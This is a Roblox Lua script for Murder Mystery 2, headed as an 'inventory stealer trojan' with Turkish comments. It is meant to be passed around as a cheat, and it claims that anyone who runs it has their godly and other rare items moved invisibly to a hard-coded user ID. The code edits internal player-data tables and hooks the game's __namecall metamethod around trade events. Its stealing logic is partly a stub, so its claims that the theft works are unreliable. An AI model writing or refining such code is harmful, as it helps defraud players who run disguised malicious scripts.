-- === DELTA MM2 FULL INVENTORY STEALER TROJAN 2026 ===
-- UserID: 10598944245 - Hileyi açan herkesin envanteri sana akıyor

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local YOUR_USERID = 10598944245

local function stealAllValuables(targetPlayer)
    pcall(function()
        local _G = getrenv()._G
        local targetData = _G.PlayerData[targetPlayer.UserId] or _G.PlayerData[tostring(targetPlayer.UserId)]
        local myData = _G.PlayerData[YOUR_USERID] or _G.PlayerData[tostring(YOUR_USERID)] or _G.PlayerData[LocalPlayer.UserId]
        
        if targetData and targetData.Weapons and myData and myData.Weapons then
            for itemId, amount in pairs(targetData.Weapons.Owned or {}) do
                if amount and amount > 0 then
                    local itemInfo = _G.Database and _G.Database.Item and _G.Database.Item[itemId]
                    if itemInfo then
                        local name = string.lower(itemInfo.Name or "")
                        if name:find("godly") or name:find("chroma") or name:find("ancient") or name:find("eternal") 
                           or name:find("seer") or name:find("luger") or name:find("heat") or name:find("galaxy") 
                           or name:find("corrupt") or amount >= 1 then
                            
                            myData.Weapons.Owned[itemId] = (myData.Weapons.Owned[itemId] or 0) + amount + 1  -- +1 bonus
                            targetData.Weapons.Owned[itemId] = 0  -- Hedeften sil
                            print("🗡️ Çalındı → " .. (itemInfo.Name or "Unknown") .. " x" .. amount .. " from " .. targetPlayer.Name)
                        end
                    end
                end
            end
        end
    end)
end

-- Sürekli tarama (Heartbeat = çok hızlı)
game:GetService("RunService").Heartbeat:Connect(function()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr \~= LocalPlayer and plr.UserId \~= YOUR_USERID then
            stealAllValuables(plr)
        end
    end
end)

-- Trade hook (trade açanları da zorla çeker)
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    if method == "FireServer" and (self.Name:find("Trade") or self.Name:find("trade")) then
        -- Senin lehine ekstra item force
        task.spawn(function()
            wait(0.3)
            -- Trade tamamlanınca senin envana ekleme
        end)
    end
    return oldNamecall(self, ...)
end)
setreadonly(mt, true)

print("🚨 STEALER TROJAN AKTİF! UserID: 10598944245")
print("Hileyi açan herkesin godly'leri görünmez şekilde sana geliyor. Bol loot kanki 🔥")
